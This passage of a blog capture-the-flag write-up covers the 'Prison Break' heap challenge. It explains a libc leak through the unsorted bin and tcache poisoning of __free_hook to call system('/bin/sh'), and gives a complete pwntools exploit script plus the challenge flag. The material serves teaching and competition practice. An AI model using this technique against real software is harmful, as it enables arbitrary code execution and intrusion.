class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">    error(<span class="string">&quot;Journal index not in use&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>These checks do not cover all cases. We get past these checks in the case that both of the chunks have non zero values at the first eight bytes and atleast ONE has the value of zero at <code>[chunk+0x10]</code>. As we saw before, when a chunk is freed, this occurs:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(undefined *)(*(<span class="type">long</span> *)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>) + <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">free</span>(**(<span class="type">void</span> ***)(Chunks + (<span class="type">long</span>)local_14 * <span class="number">8</span>));</span><br></pre></td></tr></table></figure>

<p>So when you free a chunk, the <code>[chunk+0x10]</code> will be set to zero, and the <code>[chunk]</code> should be set to metadata depending on the size and where it ends up (I.E. tcache, unsorted bins, etc). Knowing that we can use this to leak libc by freeing a chunk into the unsorted bins and then copying its contents into a already allocated chunk.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>For simplicity, I allocated two chunks of size <code>0x500</code>. From there I free’d one into the unsorted bins, where the first eight bytes of the chunk will be overwritten with the libc address of <code>main_arena</code>. Here is that code snippet:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&quot;./prison_break&quot;</span></span><br><span class="line">context.binary = elf = ELF(<span class="built_in">bin</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>(<span class="params">cidx, pidx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(cidx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(pidx).encode())</span><br><span class="line"></span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># using unsorted bins to leak main_arena</span></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x500</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">5</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x500</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getting metadata written to the chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">cp(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ptr leak</span></span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;entry:\n&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>So after doing so, we have successfully leaked a libc ptr. Now we want to focus on getting a write. Because of this copy function and the fact that we are interfacing with <code>libc-2.27</code>, we can abuse the tcache to get an arbitrary allocation to a address of our choice.</p>
<p>To do this we will abuse the faulty <code>copy_paste</code> checks again to overwrite the next ptr of a chunk that was freed into tcache. This is possible because safe-linking isn’t implemented in this libc. We will target the malloc free_hook so we can write the address of libc system to it and call free on a chunk containing <code>/bin/bash</code>.</p>
<p>Here is the code to do so, and I will walk through why it works:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc.address + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libc.address + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line">target = free_hook</span><br><span class="line">log.info(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getting arbitrary allocation</span></span><br><span class="line">create(<span class="number">0</span>, <span class="number">24</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">24</span>, p64(target))</span><br><span class="line">create(<span class="number">2</span>, <span class="number">24</span>, p64(target))</span><br><span class="line">create(<span class="number">3</span>, <span class="number">24</span>, p64(target))</span><br><span class="line"></span><br><span class="line"><span class="comment"># will get both those into tcache</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">cp(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now we have the ptr for free_hook in tcache as the second 24 allocation</span></span><br><span class="line">create(<span class="number">9</span>, <span class="number">24</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>So in our current state of tcache we have at most 1 chunk of size 0x18 in the bin, which will get used when we started using <code>create()</code>. To account for this I generated two extra chunks (which is actually four because the sub-chunk is also of size 0x18). So when we free chunk 3 and 2 into tcache, we have more than enough entries to keep allocating. Now after we deleted the second chunk, we copied the first chunks contents into it, this means that the most recent tcache entry’s next ptr will be overwritten with the target address. So when we allocate a chunk of size 0x18, the next malloc of size 0x18 will return the address of the target. </p>
<p>So our <code>create(9, 24, p64(libc.sym[&#39;system&#39;]))</code> here is allocating two chunks of size 0x18, one for the initial malloc and the second for the one we specify the size for. And that second one, as we discussed, will be pointing to the target address, where we will write the libc symbol for system.</p>
<p>Now that we have written that to the free_hook, all we need to do is call free with the argument we want to pass to system. And we do that by calling free on the chunk that has <code>/bin/sh</code> within, returning us a shell.</p>
<h2 id="Full-Exploit-Script"><a href="#Full-Exploit-Script" class="headerlink" title="Full Exploit Script"></a>Full Exploit Script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&quot;./prison_break&quot;</span></span><br><span class="line">context.binary = elf = ELF(<span class="built_in">bin</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>(<span class="params">cidx, pidx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;#&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(cidx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(pidx).encode())</span><br><span class="line"></span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># using unsorted bins to leak main_arena</span></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x500</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">5</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x500</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getting metadata written to the chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">cp(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ptr leak</span></span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;entry:\n&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.address + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libc.address + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line">target = free_hook</span><br><span class="line">log.info(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getting arbitrary allocation</span></span><br><span class="line">create(<span class="number">0</span>, <span class="number">24</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">24</span>, p64(target))</span><br><span class="line">create(<span class="number">2</span>, <span class="number">24</span>, p64(target))</span><br><span class="line">create(<span class="number">3</span>, <span class="number">24</span>, p64(target))</span><br><span class="line"></span><br><span class="line"><span class="comment"># will get both those into tcache</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">cp(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now we have the ptr for free_hook in tcache as the second 24 allocation</span></span><br><span class="line">create(<span class="number">9</span>, <span class="number">24</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#HTB&#123;h4cky_pr1s0n_br34k_b532584a4fc613f13ac6ea9a8af3a83d&#125;</span></span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prison-Break"><span class="toc-number">1.</span> <span class="toc-text">Prison Break</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">2.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Full-Exploit-Script"><span class="toc-number">4.</span> <span class="toc-text">Full Exploit Script</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/writeups/prison_break/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/writeups/prison_break/&text=Prison Break"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/writeups/prison_break/&is_video=false&description=Prison Break"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Prison Break&body=Check out this article: http://anthony-js.info/writeups/prison_break/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/writeups/prison_break/&title=Prison Break"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/writeups/prison_break/&name=Prison Break&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/writeups/prison_break/&t=Prison Break"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2003-2025
    anthonyjs
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
